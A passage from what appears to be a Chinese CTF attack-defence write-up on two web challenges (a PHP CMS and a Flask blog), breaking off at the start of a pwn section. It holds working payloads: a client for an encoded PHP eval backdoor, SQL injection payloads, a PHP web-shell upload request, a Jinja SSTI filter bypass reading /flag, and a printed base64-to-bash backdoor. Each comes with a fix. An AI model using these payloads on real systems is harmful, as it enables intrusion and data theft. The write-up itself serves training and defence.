class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">x</span><span class="params">(t,k)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(t,k*(len(t)/len(k)+<span class="number">1</span>))])</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));</span></span><br><span class="line">cmd = <span class="string">'system("cat /flag");'</span></span><br><span class="line">cmd = zlib.compress(cmd)</span><br><span class="line">cmd = x(cmd,<span class="string">"5ac91f7d"</span>)</span><br><span class="line">cmd = base64.b64encode(cmd)</span><br><span class="line"></span><br><span class="line">rawBody = <span class="string">"b9615a29bc1d&#123;cmd&#125;24d0b67c2c91"</span>.format(cmd=cmd)</span><br><span class="line">response = session.post(<span class="string">"http://192.168.100.101:50003/123.php"</span>, data=rawBody)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Response body: %s"</span> % response.content)</span><br><span class="line">res = re.findall(<span class="string">r'b9615a29bc1d(.+)24d0b67c2c91'</span>,response.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># $r=@base64_encode(@x(@gzcompress($o),$k));</span></span><br><span class="line">res = base64.b64decode(res)</span><br><span class="line">res = x(res,<span class="string">"5ac91f7d"</span>)</span><br><span class="line">res = zlib.decompress(res)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221438-a49e3fc4-ded5-1.png" alt="image.png"></p><h3 id="漏洞一修复"><a href="#漏洞一修复" class="headerlink" title="漏洞一修复"></a>漏洞一修复</h3><p>比起之前见过的一些简单粗暴的内置一句话木马，这个后门相对复杂，不至于一上来就被人打爆。防御方式不用多说，直接删掉这段代码即可。</p><h3 id="漏洞二-数据库注入"><a href="#漏洞二-数据库注入" class="headerlink" title="漏洞二 数据库注入"></a>漏洞二 数据库注入</h3><p>打开源码，会发现大量的数据库查询语句，一般只有addslashes，无任何过滤，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=addslashes($_GET[<span class="string">'cid'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT * FROM content WHERE id='$id'"</span>;</span><br></pre></td></tr></table></figure><p>直接使用sqlmap跑一下就跑出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Parameter: cid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: r=software&amp;cid=1 RLIKE (SELECT (CASE WHEN (6552=6552) THEN 1 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: r=software&amp;cid=1 AND EXTRACTVALUE(9269,CONCAT(0x5c,0x716b766271,(SELECT (ELT(9269=9269,1))),0x716a626b71))</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: r=software&amp;cid=1 AND SLEEP(5)</span><br></pre></td></tr></table></figure></p><p>可以直接通过<code>load_file</code>来读取flag。</p><h3 id="漏洞二修复"><a href="#漏洞二修复" class="headerlink" title="漏洞二修复"></a>漏洞二修复</h3><p>当时尝试把ctf用户降权，但是权限不够，那么只能从代码入手。可以在数据库查询之前，对输入参数进行过滤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $filter = <span class="string">"/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|"</span> . urldecode(<span class="string">'%09'</span>) . <span class="string">"|"</span> . urldecode(<span class="string">"%0a"</span>) . <span class="string">"|"</span> . urldecode(<span class="string">"%0b"</span>) . <span class="string">"|"</span> . urldecode(<span class="string">'%0c'</span>) . <span class="string">"|"</span> . urldecode(<span class="string">'%0d'</span>) . <span class="string">"|"</span> . urldecode(<span class="string">'%a0'</span>) . <span class="string">"/i"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter, $str)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you can't input this illegal char!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞三-文件上传"><a href="#漏洞三-文件上传" class="headerlink" title="漏洞三 文件上传"></a>漏洞三 文件上传</h3><p>查看数据库，可以看到后台密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from manage;</span><br><span class="line">+----+-------+-------+----------------------------------+---------------------------------------+-------------+----------+---------------------+</span><br><span class="line">| id | user  | name  | password                         | img                                   | mail        | qq       | date                |</span><br><span class="line">+----+-------+-------+----------------------------------+---------------------------------------+-------------+----------+---------------------+</span><br><span class="line">|  1 | admin | admin | 5df3d06e515ef461ddc315aaf1ef9963 | ../upload/touxiang/61751569137471.php | me@baidu.so | 86226999 | 2019-09-22 08:18:14 |</span><br><span class="line">+----+-------+-------+----------------------------------+---------------------------------------+-------------+----------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221456-af5dc092-ded5-1.png" alt="image.png"></p><p>登录后台可以进行头像上传</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221504-b476feae-ded5-1.png" alt="image.png"></p><p>查看源码上传部分的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'images'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">$query = <span class="string">"SELECT * FROM imageset"</span>;</span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$imageset = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../inc/up.class.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($HTTP_POST_FILES[<span class="string">'images'</span>][<span class="string">'tmp_name'</span>]))<span class="comment">//判断接收数据是否为空</span></span><br><span class="line">&#123;</span><br><span class="line">    $tmp = <span class="keyword">new</span> FileUpload_Single;</span><br><span class="line">    var_dump($tmp);</span><br><span class="line">    $upload=<span class="string">"../upload/touxiang"</span>;<span class="comment">//图片上传的目录，这里是当前目录下的upload目录，可自已修改</span></span><br><span class="line">    $tmp -&gt; accessPath =$upload;</span><br><span class="line">    <span class="keyword">if</span> ( $tmp -&gt; TODO() )</span><br><span class="line">    &#123;</span><br><span class="line">      $filename=$tmp -&gt; newFileName;<span class="comment">//生成的文件名</span></span><br><span class="line">      $filename=$upload.<span class="string">'/'</span>.$filename;</span><br><span class="line">      $imgsms=<span class="string">"及图片"</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>/inc/up.class.php</code>可能有过滤，查看一下代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUpload_Single</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//user define ------------------------------------- </span></span><br><span class="line"><span class="keyword">var</span> $accessPath ;</span><br><span class="line"><span class="keyword">var</span> $fileSize=<span class="number">4000</span>;</span><br><span class="line"><span class="keyword">var</span> $defineTypeList=<span class="string">"jpg|jpeg|gif|png|php"</span>;<span class="comment">//string jpg|gif|bmp  ...</span></span><br><span class="line"><span class="keyword">var</span> $filePrefix= <span class="string">""</span>;</span><br><span class="line"><span class="keyword">var</span>  $changNameMode=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> $uploadFile;</span><br><span class="line"><span class="keyword">var</span> $newFileName;</span><br><span class="line"><span class="keyword">var</span> $error;</span><br></pre></td></tr></table></figure></p><p>发现默认竟然可以上传php！那么直接上传php马即可，文件路径会显示在头像路径那里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/?r=manageinfo HTTP/1.1</span><br><span class="line">Host: www.kira.com</span><br><span class="line">Content-Length: 896</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://www.kira.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://www.kira.com/admin/?r=manageinfo</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8</span><br><span class="line">Cookie: PHPSESSID=553efd0695ddb859599983f05171102b; user=admin</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;user&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;password2&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail&quot;</span><br><span class="line"></span><br><span class="line">me@baidu.so</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;qq&quot;</span><br><span class="line"></span><br><span class="line">86226999</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;images&quot;; filename=&quot;123.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[c]);?&gt;</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF</span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAbFN0WGFM34xqzmF--</span><br></pre></td></tr></table></figure></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221521-be7571ce-ded5-1.png" alt="image.png"></p><h3 id="漏洞三修复"><a href="#漏洞三修复" class="headerlink" title="漏洞三修复"></a>漏洞三修复</h3><p>修改<code>/inc/up.class.php</code>处的代码，删除<code>$defineTypeList</code>中的php，不允许上传php。</p><h2 id="web2-python"><a href="#web2-python" class="headerlink" title="web2 python"></a>web2 python</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221533-c5772cba-ded5-1.png" alt="image.png"></p><p>第二个web是一个flask写的blog</p><h3 id="漏洞一-SSTI"><a href="#漏洞一-SSTI" class="headerlink" title="漏洞一 SSTI"></a>漏洞一 SSTI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        blacklist = [<span class="string">'import'</span>,<span class="string">'getattr'</span>,<span class="string">'os'</span>,<span class="string">'class'</span>,<span class="string">'subclasses'</span>,<span class="string">'mro'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'eval'</span>,<span class="string">'if'</span>,<span class="string">'for'</span>,<span class="string">' subprocess'</span>,<span class="string">'file'</span>,<span class="string">'open'</span>,<span class="string">'popen'</span>,<span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'item'</span>,<span class="string">'getitem'</span>,<span class="string">'getattribute'</span>,<span class="string">'func_globals'</span>]</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">                    s =s.replace(no,<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        a =  [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> a])+s</span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">    &#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">        &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">    '''</span> % (request.url)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(safe_jinja(template)), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>查看<code>app.py</code>，可以找到一个常见的SSTI漏洞，触发点是404，简单测试一下，发现确实可以模板注入。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221546-cd086480-ded5-1.png" alt="image.png"></p><p>代码自带了黑名单过滤，查用循环替换为空的过滤方式，浏览一下发现过滤不全，下划线，中括号，<code>init</code>，<code>globals</code>等关键字没有过滤，部分关键字可以使用字符串拼接的方式进行绕过。</p><p>最终读取flag的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/login/&#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__base__.__base__.__base__[&apos;__subcla&apos;+&apos;sses__&apos;]()[163].__init__.__globals__[&apos;__bui&apos;+&apos;ltins__&apos;][&apos;op&apos;+&apos;en&apos;](&apos;/flag&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221556-d2fd6818-ded5-1.png" alt="image.png"></p><h3 id="漏洞一-修复方法"><a href="#漏洞一-修复方法" class="headerlink" title="漏洞一 修复方法"></a>漏洞一 修复方法</h3><p>原题已经提供了过滤的函数，直接增加过滤关键字就可以进行修复，例如直接把下划线加入黑名单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">'_'</span>,<span class="string">'import'</span>,<span class="string">'getattr'</span>,<span class="string">'os'</span>,<span class="string">'class'</span>,<span class="string">'subclasses'</span>,<span class="string">'mro'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'eval'</span>,<span class="string">'if'</span>,<span class="string">'for'</span>,<span class="string">' subprocess'</span>,<span class="string">'file'</span>,<span class="string">'open'</span>,<span class="string">'popen'</span>,<span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'item'</span>,<span class="string">'getitem'</span>,<span class="string">'getattribute'</span>,<span class="string">'func_globals'</span>]</span><br></pre></td></tr></table></figure><h3 id="漏洞二-预置后门"><a href="#漏洞二-预置后门" class="headerlink" title="漏洞二 预置后门"></a>漏洞二 预置后门</h3><p>查看blog编辑器的代码<code>flask_blogging/views.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editor</span><span class="params">(post_id)</span>:</span></span><br><span class="line">    blogging_engine = _get_blogging_engine(current_app)</span><br><span class="line">    cache = blogging_engine.cache</span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        _clear_cache(cache)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> blogging_engine.blogger_permission.require():</span><br><span class="line">            post_processor = blogging_engine.post_processor</span><br><span class="line">            config = blogging_engine.config</span><br><span class="line">            storage = blogging_engine.storage</span><br><span class="line">            <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">                form = BlogEditor(request.form)</span><br><span class="line">                <span class="keyword">if</span> form.validate():</span><br><span class="line">                    post = storage.get_post_by_id(post_id)</span><br><span class="line">                    <span class="keyword">if</span> (post <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>) <span class="keyword">and</span> \</span><br><span class="line">                            (PostProcessor.is_author(post, current_user)) <span class="keyword">and</span> \</span><br><span class="line">                            (str(post[<span class="string">"post_id"</span>]) == post_id):</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        post = &#123;&#125;</span><br><span class="line">                    escape_text = config.get(<span class="string">"BLOGGING_ESCAPE_MARKDOWN"</span>, <span class="keyword">False</span>)</span><br><span class="line">                    pid = _store_form_data(form, storage, current_user, post,</span><br><span class="line">                                           escape_text)</span><br><span class="line">                    editor_post_saved.send(blogging_engine.app,</span><br><span class="line">                                           engine=blogging_engine,</span><br><span class="line">                                           post_id=pid,</span><br><span class="line">                                           user=current_user,</span><br><span class="line">                                           post=post)</span><br><span class="line">                    flash(<span class="string">"Blog posted successfully!"</span>, <span class="string">"info"</span>)</span><br><span class="line">                    slug = post_processor.create_slug(form.title.data)</span><br><span class="line">                    <span class="keyword">return</span> redirect(url_for(<span class="string">"blogging.page_by_id"</span>, post_id=pid,</span><br><span class="line">                                            slug=slug))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flash(<span class="string">"There were errors in blog submission"</span>, <span class="string">"warning"</span>)</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">"blogging/editor.html"</span>, form=form,</span><br><span class="line">                                           post_id=post_id, config=config)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> post_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                    post = storage.get_post_by_id(post_id)</span><br><span class="line">                    <span class="keyword">if</span> (post <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>) <span class="keyword">and</span> \</span><br><span class="line">                            (PostProcessor.is_author(post, current_user)):</span><br><span class="line">                        tags = <span class="string">" "</span>.join(post[<span class="string">"tags"</span>])</span><br><span class="line">                        form = BlogEditor(title=post[<span class="string">"title"</span>],</span><br><span class="line">                                          text=post[<span class="string">"text"</span>], tags=tags, public=post[<span class="string">'public'</span>])</span><br><span class="line">                        editor_get_fetched.send(blogging_engine.app,</span><br><span class="line">                                                engine=blogging_engine,</span><br><span class="line">                                                post_id=post_id,</span><br><span class="line">                                                form=form)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">"blogging/editor.html"</span>,</span><br><span class="line">                                               form=form, post_id=post_id,</span><br><span class="line">                                               config=config)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        flash(<span class="string">"You do not have the rights to edit this post"</span>,</span><br><span class="line">                              <span class="string">"warning"</span>)</span><br><span class="line">                        <span class="keyword">return</span> redirect(url_for(<span class="string">"blogging.index"</span>,</span><br><span class="line">                                                post_id=<span class="keyword">None</span>))</span><br><span class="line"></span><br><span class="line">            form = BlogEditor()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                bingo = popen(<span class="string">'echo Y2F0IC9mbGFnCg==|base64 -d|bash'</span>).read()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                bingo = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"blogging/editor.html"</span>, form=form,</span><br><span class="line">                                   post_id=post_id, config=config, bingo=bingo)</span><br><span class="line">    <span class="keyword">except</span> PermissionDenied:</span><br><span class="line">        flash(<span class="string">"You do not have permissions to create or edit posts"</span>, <span class="string">"warning"</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"blogging.index"</span>, post_id=<span class="keyword">None</span>))</span><br></pre></td></tr></table></figure></p><p>留意到这个函数有一句<code>bingo = popen(&#39;echo Y2F0IC9mbGFnCg==|base64 -d|bash&#39;).read()</code>，进行了命令执行，base64解码可以看到执行了<code>cat /flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> echo Y2F0IC9mbGFnCg==|base64 -d</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure><p>函数开头有<code>@login_required</code>装饰器，因此需要进行登陆。</p><p>根据数据库的代码，可以找到数据库文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///data/ezBlog.db'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model, UserMixin)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'user'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">32</span>), unique=<span class="keyword">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">64</span>), unique=<span class="keyword">True</span>)</span><br><span class="line">    <span class="comment">#posts = blog_db.relationship(, backref = , lazy = ) ## posts blongs to cur user</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br></pre></td></tr></table></figure></p><p>使用sqlite studio查看数据库，可以看到默认的账号密码</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221609-db3c5106-ded5-1.png" alt="image.png"></p><p>使用test，test登陆后，在blog编辑界面就可以看到flag</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221616-def1e626-ded5-1.png" alt="image.png"></p><h3 id="漏洞二-修复方法"><a href="#漏洞二-修复方法" class="headerlink" title="漏洞二 修复方法"></a>漏洞二 修复方法</h3><p>方法一：直接把命令执行的代码删除或者改掉</p><p>方法二：修改后台弱口令</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/za/qwb&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>题目什么保护都没开，可见难度不会太大。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 